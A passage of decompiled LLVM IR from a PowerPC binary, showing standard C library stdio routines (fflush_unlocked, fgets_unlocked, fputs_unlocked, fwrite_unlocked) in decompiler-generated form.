  %storemerge8 = load i32, i32* bitcast (i32** @global_var_1001d804.351 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000490411 = icmp eq i32 %storemerge8, 0
  %v0_1000490812 = load i32, i32* @r30, align 4
  br i1 %v3_1000490411, label %dec_label_pc_10004910, label %dec_label_pc_100048bc

dec_label_pc_100048bc:                            ; preds = %dec_label_pc_1000488c, %dec_label_pc_10004904.backedge
  %v0_1000490817 = phi i32 [ %v0_10004908, %dec_label_pc_10004904.backedge ], [ %v0_1000490812, %dec_label_pc_1000488c ]
  %v3_1000490818.in = phi i32 [ %v0_10004908, %dec_label_pc_10004904.backedge ], [ %v0_1000490812, %dec_label_pc_1000488c ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_10004904.backedge ], [ %storemerge8, %dec_label_pc_1000488c ]
  %v1_100048bc = inttoptr i32 %storemerge16 to i16*
  %v2_100048bc = load i16, i16* %v1_100048bc, align 2
  %v1_100048c0 = add i32 %storemerge16, 32
  %v2_100048c0 = inttoptr i32 %v1_100048c0 to i32*
  %v3_100048c0 = load i32, i32* %v2_100048c0, align 4
  store i32 %v3_100048c0, i32* @r31, align 4
  %v1_100048c4 = and i16 %v2_100048bc, -32720
  %v3_100048c8 = icmp eq i16 %v1_100048c4, 48
  br i1 %v3_100048c8, label %dec_label_pc_100048d8, label %dec_label_pc_100048d0

dec_label_pc_100048d0:                            ; preds = %dec_label_pc_100048bc
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_10004904.backedge

dec_label_pc_100048d8:                            ; preds = %dec_label_pc_100048bc
  %v3_1000490818 = icmp eq i32 %v3_1000490818.in, 0
  br i1 %v3_1000490818, label %dec_label_pc_100048dc, label %dec_label_pc_100048e8

dec_label_pc_100048dc:                            ; preds = %dec_label_pc_100048d8
  store i32 %v3_100048c0, i32* bitcast (i32** @global_var_1001d804.351 to i32*), align 4
  br label %dec_label_pc_100048ec

dec_label_pc_100048e8:                            ; preds = %dec_label_pc_100048d8
  %v2_100048e8 = add i32 %v0_1000490817, 32
  %v3_100048e8 = inttoptr i32 %v2_100048e8 to i32*
  store i32 %v3_100048c0, i32* %v3_100048e8, align 4
  %v0_100048ec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100048ec

dec_label_pc_100048ec:                            ; preds = %dec_label_pc_100048dc, %dec_label_pc_100048e8
  %v0_100048ec = phi i32 [ %storemerge16, %dec_label_pc_100048dc ], [ %v0_100048ec.pre, %dec_label_pc_100048e8 ]
  %v1_100048ec = inttoptr i32 %v0_100048ec to i16*
  %v2_100048ec = load i16, i16* %v1_100048ec, align 2
  store i32 %v0_100048ec, i32* @r3, align 4
  %v1_100048f4 = and i16 %v2_100048ec, 8192
  %v3_100048f4 = icmp eq i16 %v1_100048f4, 0
  br i1 %v3_100048f4, label %dec_label_pc_10004904.backedge, label %dec_label_pc_100048fc

dec_label_pc_10004904.backedge:                   ; preds = %dec_label_pc_100048ec, %dec_label_pc_100048d0, %dec_label_pc_100048fc
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10004904 = icmp eq i32 %storemerge, 0
  %v0_10004908 = load i32, i32* @r30, align 4
  br i1 %v3_10004904, label %dec_label_pc_10004910, label %dec_label_pc_100048bc

dec_label_pc_100048fc:                            ; preds = %dec_label_pc_100048ec
  store i32 268454144, i32* @lr, align 4
  %v0_100048fc = call i32 @free()
  br label %dec_label_pc_10004904.backedge

dec_label_pc_10004910:                            ; preds = %dec_label_pc_10004904.backedge, %dec_label_pc_1000488c
  store i32 %v2_10004898, i32* @r3, align 4
  %v0_10004918 = call i32 @__pthread_return_void()
  %v0_10004920 = load i32, i32* @r29, align 4
  store i32 %v0_10004920, i32* @global_var_1001d868.345, align 4
  %v3_1000492c.pre = load i32, i32* @global_var_1001d864.344, align 4
  br label %dec_label_pc_10004924

dec_label_pc_10004924:                            ; preds = %entry, %dec_label_pc_1000487c, %dec_label_pc_10004910
  %v3_1000492c = phi i32 [ %v3_10004870, %entry ], [ 1, %dec_label_pc_1000487c ], [ %v3_1000492c.pre, %dec_label_pc_10004910 ]
  store i32 %v2_10004858, i32* @r3, align 4
  %v1_10004934 = add i32 %v3_1000492c, -1
  store i32 %v1_10004934, i32* @global_var_1001d864.344, align 4
  %v0_1000493c = call i32 @__pthread_return_void()
  ret i32 %v0_1000493c

; uselistorder directives
  uselistorder i32 %v0_10004908, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_100048ec, { 1, 0 }
  uselistorder i32 %v3_100048c0, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10004924, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004904.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100048ec, { 1, 0 }
  uselistorder label %dec_label_pc_100048bc, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1001d804.351 to i32), i32* %r9.global-to-local, align 4
  %v5_10004964 = icmp eq i16* %arg1, bitcast (i32** @global_var_1001d804.351 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10004964, label %dec_label_pc_10004988, label %dec_label_pc_1000497c

dec_label_pc_1000497c:                            ; preds = %entry
  %v4_1000497c = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1000497c, label %dec_label_pc_10004988, label %dec_label_pc_10004ab4

dec_label_pc_10004988:                            ; preds = %dec_label_pc_1000497c, %entry
  store i32 268435456, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d24.342 to i32), i32* @r30, align 4
  %v2_10004994 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004994, i32* @r3, align 4
  %v0_100049a8 = call i32 @__pthread_return_void()
  %v0_100049b0 = call i32 @__pthread_return_0()
  %v3_100049b8 = load i32, i32* @global_var_1001d864.344, align 4
  store i32 %v2_10004994, i32* @r3, align 4
  %v1_100049cc = add i32 %v3_100049b8, 1
  store i32 %v1_100049cc, i32* %r9.global-to-local, align 4
  store i32 %v1_100049cc, i32* @global_var_1001d864.344, align 4
  %v0_100049d4 = call i32 @__pthread_return_void()
  store i32 %v2_10004994, i32* @r3, align 4
  %v0_100049e4 = call i32 @__pthread_return_void()
  %v0_100049ec = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100049f4 = load i32, i32* bitcast (i32** @global_var_1001d804.351 to i32*), align 4
  store i32 %v3_100049f4, i32* @r31, align 4
  store i32 %v2_10004994, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  %v0_10004a04 = call i32 @__pthread_return_void()
  %v0_10004aa4.pr = load i32, i32* @r31, align 4
  %v3_10004aa43 = icmp eq i32 %v0_10004aa4.pr, 0
  br i1 %v3_10004aa43, label %dec_label_pc_10004aac, label %dec_label_pc_10004a0c

dec_label_pc_10004a0c:                            ; preds = %dec_label_pc_10004988, %dec_label_pc_10004aa0
  %v0_10004a28 = phi i32 [ %v3_10004aa0, %dec_label_pc_10004aa0 ], [ %v0_10004aa4.pr, %dec_label_pc_10004988 ]
  %v1_10004a0c = inttoptr i32 %v0_10004a28 to i16*
  %v2_10004a0c = load i16, i16* %v1_10004a0c, align 2
  %v3_10004a0c = zext i16 %v2_10004a0c to i32
  %v1_10004a10 = and i32 %v3_10004a0c, 64
  store i32 %v1_10004a10, i32* %r9.global-to-local, align 4
  %v3_10004a10 = icmp eq i32 %v1_10004a10, 0
  br i1 %v3_10004a10, label %dec_label_pc_10004aa0, label %dec_label_pc_10004a18

dec_label_pc_10004a18:                            ; preds = %dec_label_pc_10004a0c
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10004a1c = load i32, i32* @global_var_1001d808.349, align 4
  %v3_10004a20 = icmp eq i32 %v3_10004a1c, 2
  br i1 %v3_10004a20, label %dec_label_pc_10004a44, label %dec_label_pc_10004a28

dec_label_pc_10004a28:                            ; preds = %dec_label_pc_10004a18
  store i32 %v2_10004994, i32* @r3, align 4
  %v0_10004a38 = call i32 @__pthread_return_void()
  %v0_10004a40 = call i32 @__pthread_return_0()
  %v0_10004a44.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004a44

dec_label_pc_10004a44:                            ; preds = %dec_label_pc_10004a18, %dec_label_pc_10004a28
  %v0_10004a58 = phi i32 [ %v0_10004a28, %dec_label_pc_10004a18 ], [ %v0_10004a44.pre, %dec_label_pc_10004a28 ]
  %v1_10004a44 = inttoptr i32 %v0_10004a58 to i16*
  %v2_10004a44 = load i16, i16* %v1_10004a44, align 2
  %v3_10004a44 = zext i16 %v2_10004a44 to i32
  %v0_10004a48 = load i32, i32* @r27, align 4
  %v2_10004a48 = or i32 %v0_10004a48, %v3_10004a44
  %v1_10004a4c = and i32 %v2_10004a48, 832
  %v1_10004a50 = xor i32 %v1_10004a4c, 320
  store i32 %v1_10004a50, i32* %r9.global-to-local, align 4
  %v3_10004a50 = icmp eq i32 %v1_10004a50, 0
  br i1 %v3_10004a50, label %dec_label_pc_10004a58, label %dec_label_pc_10004a84

dec_label_pc_10004a58:                            ; preds = %dec_label_pc_10004a44
  store i32 %v0_10004a58, i32* @r3, align 4
  store i32 268454496, i32* @lr, align 4
  %v0_10004a5c = call i32 @__stdio_wcommit()
  %v3_10004a60 = icmp eq i32 %v0_10004a5c, 0
  br i1 %v3_10004a60, label %dec_label_pc_10004a70, label %dec_label_pc_10004a68

dec_label_pc_10004a68:                            ; preds = %dec_label_pc_10004a58
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10004a84

dec_label_pc_10004a70:                            ; preds = %dec_label_pc_10004a58
  %v0_10004a70 = load i32, i32* @r31, align 4
  %v1_10004a70 = inttoptr i32 %v0_10004a70 to i16*
  %v2_10004a70 = load i16, i16* %v1_10004a70, align 2
  %v3_10004a70 = zext i16 %v2_10004a70 to i32
  %v1_10004a74 = add i32 %v0_10004a70, 8
  %v2_10004a74 = inttoptr i32 %v1_10004a74 to i32*
  %v3_10004a74 = load i32, i32* %v2_10004a74, align 4
  store i32 %v3_10004a74, i32* %r9.global-to-local, align 4
  %v1_10004a78 = call i32 @__asm_rlwinm(i32 %v3_10004a70, i32 0, i32 26, i32 24)
  %v2_10004a78 = trunc i32 %v1_10004a78 to i16
  %v1_10004a7c = load i32, i32* @r31, align 4
  %v2_10004a7c = add i32 %v1_10004a7c, 28
  %v3_10004a7c = inttoptr i32 %v2_10004a7c to i32*
  store i32 %v3_10004a74, i32* %v3_10004a7c, align 4
  %v3_10004a80 = load i32, i32* @r31, align 4
  %v4_10004a80 = inttoptr i32 %v3_10004a80 to i16*
  store i16 %v2_10004a78, i16* %v4_10004a80, align 2
  br label %dec_label_pc_10004a84

dec_label_pc_10004a84:                            ; preds = %dec_label_pc_10004a44, %dec_label_pc_10004a68, %dec_label_pc_10004a70
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10004a88 = load i32, i32* @global_var_1001d808.349, align 4
  %v3_10004a8c = icmp eq i32 %v3_10004a88, 2
  br i1 %v3_10004a8c, label %dec_label_pc_10004aa0, label %dec_label_pc_10004a94

dec_label_pc_10004a94:                            ; preds = %dec_label_pc_10004a84
  store i32 %v2_10004994, i32* @r3, align 4
  %v0_10004a9c = call i32 @__pthread_return_void()
  br label %dec_label_pc_10004aa0

dec_label_pc_10004aa0:                            ; preds = %dec_label_pc_10004a84, %dec_label_pc_10004a0c, %dec_label_pc_10004a94
  %v0_10004aa0 = load i32, i32* @r31, align 4
  %v1_10004aa0 = add i32 %v0_10004aa0, 32
  %v2_10004aa0 = inttoptr i32 %v1_10004aa0 to i32*
  %v3_10004aa0 = load i32, i32* %v2_10004aa0, align 4
  store i32 %v3_10004aa0, i32* @r31, align 4
  %v3_10004aa4 = icmp eq i32 %v3_10004aa0, 0
  br i1 %v3_10004aa4, label %dec_label_pc_10004aac, label %dec_label_pc_10004a0c

dec_label_pc_10004aac:                            ; preds = %dec_label_pc_10004aa0, %dec_label_pc_10004988
  store i32 ptrtoint (i32* @global_var_10004ab0.376 to i32), i32* @lr, align 4
  %v0_10004aac = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_10004aec

dec_label_pc_10004ab4:                            ; preds = %dec_label_pc_1000497c
  %v3_10004ab4 = load i16, i16* %arg1, align 2
  %v4_10004ab4 = zext i16 %v3_10004ab4 to i32
  store i32 0, i32* @r28, align 4
  %v1_10004abc = and i32 %v4_10004ab4, 64
  store i32 %v1_10004abc, i32* %r9.global-to-local, align 4
  %v3_10004abc = icmp eq i32 %v1_10004abc, 0
  br i1 %v3_10004abc, label %dec_label_pc_10004aec, label %dec_label_pc_10004ac4

dec_label_pc_10004ac4:                            ; preds = %dec_label_pc_10004ab4
  store i32 268454600, i32* @lr, align 4
  %v0_10004ac4 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_10004acc = icmp eq i32 %v0_10004ac4, 0
  br i1 %v3_10004acc, label %dec_label_pc_10004ad4, label %dec_label_pc_10004aec

dec_label_pc_10004ad4:                            ; preds = %dec_label_pc_10004ac4
  %v0_10004ad4 = load i32, i32* @r29, align 4
  %v1_10004ad4 = inttoptr i32 %v0_10004ad4 to i16*
  %v2_10004ad4 = load i16, i16* %v1_10004ad4, align 2
  %v3_10004ad4 = zext i16 %v2_10004ad4 to i32
  store i32 0, i32* @r28, align 4
  %v1_10004adc = add i32 %v0_10004ad4, 8
  %v2_10004adc = inttoptr i32 %v1_10004adc to i32*
  %v3_10004adc = load i32, i32* %v2_10004adc, align 4
  store i32 %v3_10004adc, i32* %r9.global-to-local, align 4
  %v1_10004ae0 = call i32 @__asm_rlwinm(i32 %v3_10004ad4, i32 0, i32 26, i32 24)
  %v2_10004ae0 = trunc i32 %v1_10004ae0 to i16
  %v3_10004ae4 = load i32, i32* @r29, align 4
  %v4_10004ae4 = inttoptr i32 %v3_10004ae4 to i16*
  store i16 %v2_10004ae0, i16* %v4_10004ae4, align 2
  %v0_10004ae8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004ae8 = load i32, i32* @r29, align 4
  %v2_10004ae8 = add i32 %v1_10004ae8, 28
  %v3_10004ae8 = inttoptr i32 %v2_10004ae8 to i32*
  store i32 %v0_10004ae8, i32* %v3_10004ae8, align 4
  br label %dec_label_pc_10004aec

dec_label_pc_10004aec:                            ; preds = %dec_label_pc_10004ac4, %dec_label_pc_10004ab4, %dec_label_pc_10004aac, %dec_label_pc_10004ad4
  %v0_10004af0 = load i32, i32* @r28, align 4
  ret i32 %v0_10004af0

; uselistorder directives
  uselistorder i32 %v3_10004aa0, { 1, 2, 0 }
  uselistorder i32 %v1_10004a50, { 1, 0 }
  uselistorder i32 %v2_10004994, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1001d804.351 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_1001d864.344, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10004aec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10004aa0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004a44, { 1, 0 }
  uselistorder label %dec_label_pc_10004a0c, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10004bac, label %dec_label_pc_10004b24

dec_label_pc_10004b24:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_10004b8c3 = add i32 %arg2, -1
  store i32 %v2_10004b8c3, i32* @r29, align 4
  %v4_10004b949 = icmp eq i32 %arg2, 1
  br i1 %v4_10004b949, label %dec_label_pc_10004b98, label %dec_label_pc_10004b2c

dec_label_pc_10004b2c:                            ; preds = %dec_label_pc_10004b24, %dec_label_pc_10004b8c.backedge
  %v2_10004b48 = phi i32 [ %v2_10004b4812, %dec_label_pc_10004b8c.backedge ], [ %tmp, %dec_label_pc_10004b24 ]
  %v0_10004b2c = phi i32 [ %v0_10004b90, %dec_label_pc_10004b8c.backedge ], [ %arg3, %dec_label_pc_10004b24 ]
  %v1_10004b2c = add i32 %v0_10004b2c, 16
  %v2_10004b2c = inttoptr i32 %v1_10004b2c to i32*
  %v3_10004b2c = load i32, i32* %v2_10004b2c, align 4
  %v1_10004b30 = add i32 %v0_10004b2c, 24
  %v2_10004b30 = inttoptr i32 %v1_10004b30 to i32*
  %v3_10004b30 = load i32, i32* %v2_10004b30, align 4
  %v2_10004b34 = add i32 %v3_10004b2c, 1
  store i32 %v2_10004b34, i32* %r11.global-to-local, align 4
  %v3_10004b38 = icmp ult i32 %v3_10004b2c, %v3_10004b30
  %v5_10004b38 = icmp eq i32 %v3_10004b2c, %v3_10004b30
  store i1 %v5_10004b38, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004b38, label %dec_label_pc_10004b40, label %dec_label_pc_10004b5c

dec_label_pc_10004b40:                            ; preds = %dec_label_pc_10004b2c
  %v4_10004b2c = inttoptr i32 %v3_10004b2c to i8*
  %v3_10004b40 = load i8, i8* %v4_10004b2c, align 1
  %v3_10004b44 = icmp eq i8 %v3_10004b40, 10
  store i1 %v3_10004b44, i1* %cr7_eq.global-to-local, align 1
  %v3_10004b48 = inttoptr i32 %v2_10004b48 to i8*
  store i8 %v3_10004b40, i8* %v3_10004b48, align 1
  %v0_10004b4c = load i32, i32* %r11.global-to-local, align 4
  %v1_10004b4c = load i32, i32* @r30, align 4
  %v2_10004b4c = add i32 %v1_10004b4c, 16
  %v3_10004b4c = inttoptr i32 %v2_10004b4c to i32*
  store i32 %v0_10004b4c, i32* %v3_10004b4c, align 4
  %v0_10004b50 = load i32, i32* @r31, align 4
  %v1_10004b50 = add i32 %v0_10004b50, 1
  store i32 %v1_10004b50, i32* @r31, align 4
  %v0_10004b54 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004b54, label %dec_label_pc_10004b98, label %dec_label_pc_10004b8c.backedge

dec_label_pc_10004b5c:                            ; preds = %dec_label_pc_10004b2c
  %v1_10004b9010 = inttoptr i32 %v0_10004b2c to i16*
  store i32 268454752, i32* @lr, align 4
  %v5_10004b5c = call i32 @getc_unlocked(i16* %v1_10004b9010, i32 %v3_10004b2c)
  %v6_10004b5c = trunc i32 %v5_10004b5c to i8
  %v4_10004b60 = icmp eq i8 %v6_10004b5c, -1
  store i1 %v4_10004b60, i1* %cr7_eq.global-to-local, align 1
  %v3_10004b68 = icmp eq i8 %v6_10004b5c, 10
  store i1 %v3_10004b68, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10004b60, label %dec_label_pc_10004b70, label %dec_label_pc_10004b80

dec_label_pc_10004b70:                            ; preds = %dec_label_pc_10004b5c
  %v0_10004b70 = load i32, i32* @r30, align 4
  %v1_10004b70 = inttoptr i32 %v0_10004b70 to i16*
  %v2_10004b70 = load i16, i16* %v1_10004b70, align 2
  %v1_10004b74 = and i16 %v2_10004b70, 8
  %v3_10004b74 = icmp eq i16 %v1_10004b74, 0
  br i1 %v3_10004b74, label %dec_label_pc_10004b70.dec_label_pc_10004b98_crit_edge, label %dec_label_pc_10004bac

dec_label_pc_10004b70.dec_label_pc_10004b98_crit_edge: ; preds = %dec_label_pc_10004b70
  %v0_10004b98.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004b98

dec_label_pc_10004b80:                            ; preds = %dec_label_pc_10004b5c
  %v3_10004b80 = load i32, i32* @r31, align 4
  %v4_10004b80 = inttoptr i32 %v3_10004b80 to i8*
  store i8 %v6_10004b5c, i8* %v4_10004b80, align 1
  %v0_10004b84 = load i32, i32* @r31, align 4
  %v1_10004b84 = add i32 %v0_10004b84, 1
  store i32 %v1_10004b84, i32* @r31, align 4
  %v0_10004b88 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10004b88, label %dec_label_pc_10004b98, label %dec_label_pc_10004b8c.backedge

dec_label_pc_10004b8c.backedge:                   ; preds = %dec_label_pc_10004b80, %dec_label_pc_10004b40
  %v2_10004b4812 = phi i32 [ %v1_10004b84, %dec_label_pc_10004b80 ], [ %v1_10004b50, %dec_label_pc_10004b40 ]
  %v0_10004b8c = load i32, i32* @r29, align 4
  %v2_10004b8c = add i32 %v0_10004b8c, -1
  store i32 %v2_10004b8c, i32* @r29, align 4
  %v0_10004b90 = load i32, i32* @r30, align 4
  %v4_10004b94 = icmp eq i32 %v0_10004b8c, 1
  br i1 %v4_10004b94, label %dec_label_pc_10004b98, label %dec_label_pc_10004b2c

dec_label_pc_10004b98:                            ; preds = %dec_label_pc_10004b80, %dec_label_pc_10004b8c.backedge, %dec_label_pc_10004b40, %dec_label_pc_10004b24, %dec_label_pc_10004b70.dec_label_pc_10004b98_crit_edge
  %v2_10004ba4 = phi i32 [ %v0_10004b98.pre, %dec_label_pc_10004b70.dec_label_pc_10004b98_crit_edge ], [ %tmp, %dec_label_pc_10004b24 ], [ %v1_10004b50, %dec_label_pc_10004b40 ], [ %v2_10004b4812, %dec_label_pc_10004b8c.backedge ], [ %v1_10004b84, %dec_label_pc_10004b80 ]
  %v1_10004b98 = load i32, i32* @r28, align 4
  %v3_10004b98 = icmp ugt i32 %v2_10004ba4, %v1_10004b98
  %v4_10004b98 = icmp eq i32 %v2_10004ba4, %v1_10004b98
  store i1 %v4_10004b98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004b98, label %dec_label_pc_10004ba0, label %dec_label_pc_10004bac

dec_label_pc_10004ba0:                            ; preds = %dec_label_pc_10004b98
  %v3_10004ba4 = inttoptr i32 %v2_10004ba4 to i8*
  store i8 0, i8* %v3_10004ba4, align 1
  %v0_10004bb4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10004bb0

dec_label_pc_10004bac:                            ; preds = %dec_label_pc_10004b70, %dec_label_pc_10004b98, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10004bb0

dec_label_pc_10004bb0:                            ; preds = %dec_label_pc_10004ba0, %dec_label_pc_10004bac
  %v0_10004bb4 = phi i32 [ %v0_10004bb4.pre, %dec_label_pc_10004ba0 ], [ 0, %dec_label_pc_10004bac ]
  ret i32 %v0_10004bb4

; uselistorder directives
  uselistorder i32 %v2_10004ba4, { 0, 2, 1 }
  uselistorder i8 %v6_10004b5c, { 1, 0, 2 }
  uselistorder i32 %v3_10004b30, { 1, 0 }
  uselistorder i32 %v3_10004b2c, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10004b2c, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10004bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10004bac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004b98, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10004b2c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10004be0 = call i32 @__GI_strlen()
  store i32 %v0_10004be0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10004bfc.377 to i32), i32* @lr, align 4
  %v4_10004bf8 = inttoptr i32 %arg2 to i16*
  %v5_10004bf8 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_10004be0, i16* %v4_10004bf8)
  %v1_10004c00 = load i32, i32* @r27, align 4
  %v4_10004c00 = icmp eq i32 %v5_10004bf8, %v1_10004c00
  br i1 %v4_10004c00, label %dec_label_pc_10004c08, label %dec_label_pc_10004c0c

dec_label_pc_10004c08:                            ; preds = %entry
  br label %dec_label_pc_10004c0c

dec_label_pc_10004c0c:                            ; preds = %entry, %dec_label_pc_10004c08
  %v0_10004c0c = phi i32 [ -1, %entry ], [ %v5_10004bf8, %dec_label_pc_10004c08 ]
  ret i32 %v0_10004c0c

; uselistorder directives
  uselistorder label %dec_label_pc_10004c0c, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v3_10004c30 = load i16, i16* %arg4, align 2
  %v4_10004c30 = zext i16 %v3_10004c30 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_10004c44 = call i32 @__asm_rlwinm(i32 %v4_10004c30, i32 0, i32 24, i32 25)
  store i32 128, i32* %r4.global-to-local, align 4
  %v3_10004c4c = icmp eq i32 %v1_10004c44, 192
  store i32 %arg3, i32* @r31, align 4
  br i1 %v3_10004c4c, label %dec_label_pc_10004c68, label %dec_label_pc_10004c5c

dec_label_pc_10004c5c:                            ; preds = %entry
  store i32 268455008, i32* @lr, align 4
  %v4_10004c5c = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v3_10004c60 = icmp eq i32 %v4_10004c5c, 0
  br i1 %v3_10004c60, label %dec_label_pc_10004c5c.dec_label_pc_10004c68_crit_edge, label %dec_label_pc_10004cc0

dec_label_pc_10004c5c.dec_label_pc_10004c68_crit_edge: ; preds = %dec_label_pc_10004c5c
  %v0_10004c6c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004c68

dec_label_pc_10004c68:                            ; preds = %dec_label_pc_10004c5c.dec_label_pc_10004c68_crit_edge, %entry
  %v0_10004c8c = phi i32 [ %v0_10004c6c.pre, %dec_label_pc_10004c5c.dec_label_pc_10004c68_crit_edge ], [ %arg3, %entry ]
  %v0_10004c68 = load i32, i32* @r29, align 4
  %v3_10004c68 = icmp eq i32 %v0_10004c68, 0
  %v3_10004c6c = icmp eq i32 %v0_10004c8c, 0
  %brmerge = or i1 %v3_10004c6c, %v3_10004c68
  br i1 %brmerge, label %dec_label_pc_10004cc0, label %dec_label_pc_10004c78

dec_label_pc_10004c78:                            ; preds = %dec_label_pc_10004c68
  %v2_10004c7c = mul i32 %v0_10004c68, %v0_10004c8c
  store i32 %v2_10004c7c, i32* %r4.global-to-local, align 4
  %v2_10004c80 = udiv i32 -1, %v0_10004c68
  %v0_10004c88 = load i32, i32* @r30, align 4
  %v3_10004c8c = icmp ugt i32 %v0_10004c8c, %v2_10004c80
  %v1_10004ca0 = inttoptr i32 %v0_10004c88 to i16*
  br i1 %v3_10004c8c, label %dec_label_pc_10004ca0, label %dec_label_pc_10004c94

dec_label_pc_10004c94:                            ; preds = %dec_label_pc_10004c78
  %v0_10004c84 = load i32, i32* @r28, align 4
  store i32 268455064, i32* @lr, align 4
  %v5_10004c94 = call i32 @__stdio_fwrite(i32 %v0_10004c84, i32 %v2_10004c7c, i16* %v1_10004ca0)
  %v1_10004c98 = load i32, i32* @r29, align 4
  %v2_10004c98 = udiv i32 %v5_10004c94, %v1_10004c98
  store i32 %v2_10004c98, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10004cc4

dec_label_pc_10004ca0:                            ; preds = %dec_label_pc_10004c78
  %v2_10004ca0 = load i16, i16* %v1_10004ca0, align 2
  %v1_10004ca4 = or i16 %v2_10004ca0, 8
  store i16 %v1_10004ca4, i16* %v1_10004ca0, align 2
  %v0_10004cac = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10004cb8 = inttoptr i32 %v0_10004cac to i32*
  store i32 22, i32* %v2_10004cb8, align 4
  %v0_10004cc8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10004cc4

dec_label_pc_10004cc0:                            ; preds = %dec_label_pc_10004c68, %dec_label_pc_10004c5c
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10004cc4

dec_label_pc_10004cc4:                            ; preds = %dec_label_pc_10004ca0, %dec_label_pc_10004c94, %dec_label_pc_10004cc0
  %v0_10004cc8 = phi i32 [ %v0_10004cc8.pre, %dec_label_pc_10004ca0 ], [ %v2_10004c98, %dec_label_pc_10004c94 ], [ 0, %dec_label_pc_10004cc0 ]
  ret i32 %v0_10004cc8

; uselistorder directives
  uselistorder i16* %v1_10004ca0, { 1, 2, 0 }
  uselistorder i32 %v0_10004c68, { 1, 0, 2 }
  uselistorder i32 %v0_10004c8c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
